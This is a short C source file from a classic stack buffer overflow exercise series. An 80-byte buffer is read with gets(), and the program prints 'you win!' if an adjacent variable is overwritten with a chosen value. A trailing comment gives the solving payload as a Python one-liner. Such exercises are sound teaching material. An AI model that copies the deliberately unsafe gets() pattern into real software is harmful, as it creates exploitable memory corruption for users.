/* stack2-stdin.c                               *
 * specially crafted to feed your brain by gera */

#include <stdio.h>

int main() {
	int cookie;
	char buf[80];

	printf("buf: %08x cookie: %08x\n", &buf, &cookie);
	gets(buf);

	if (cookie == 0x01020305)
  		printf("you win!\n");
}

//Nothing special, this was just like stack1.c, very easy
//python -c 'print "a"*92  + "\x05\x03\x02\x01"' > /tmp/input
//run < /tmp/input
